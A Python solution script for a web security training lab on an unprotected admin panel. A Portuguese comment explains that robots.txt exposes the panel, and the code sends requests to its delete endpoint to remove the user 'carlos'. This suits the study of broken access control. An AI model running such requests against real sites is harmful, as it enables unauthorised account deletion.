# Batch import libs. I know this is messy behavior but it's for quick prototyping.
import requests
from base64 import b64encode, b64decode, urlsafe_b64encode, urlsafe_b64decode
from time import time
import re
import subprocess
from concurrent.futures import ThreadPoolExecutor
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from http import cookies
import sys


# Lab:  Unprotected admin panel
## eh bem idiota esse, acessa o robots.txt e ve q tem um endpoint de admin que nao ta validando direito

###################### Meat & Potatoes ######################

BASE_URL = "https://0a5000740330956680d917ef00cf0031.web-security-academy.net"
session = requests.Session()


# Now, we need to GET this url with the correct cookie to delete the desired user
def deletecarlos():
    url = BASE_URL + "/administrator-panel/delete?username=carlos"
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
            "Referer": url,
            "Origin": BASE_URL,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            
        } 
    
    r_get = session.get(url, headers=headers, allow_redirects=True)
    print("GET status:", r_get.status_code)
    # show session cookies obtained automatically
    print("cookies:", session.cookies.get_dict())

    # take the in-memory session cookie and put it into the Cookie header (URL-encode value)
    from urllib.parse import quote
    cookies_dict = session.cookies.get_dict()
    if cookies_dict:
        name, value = next(iter(cookies_dict.items()))
        headers["Cookie"] = f"{name}={quote(value)}"

    r = session.get(url, headers=headers, allow_redirects=True)


def main():
    # Allow BASE_URL to be modified via command line
    global BASE_URL
    if len(sys.argv) > 1:
        BASE_URL = sys.argv[1].rstrip("/") + "/"
    # Delete carlos
    deletecarlos()
    
if __name__ == "__main__":
    main()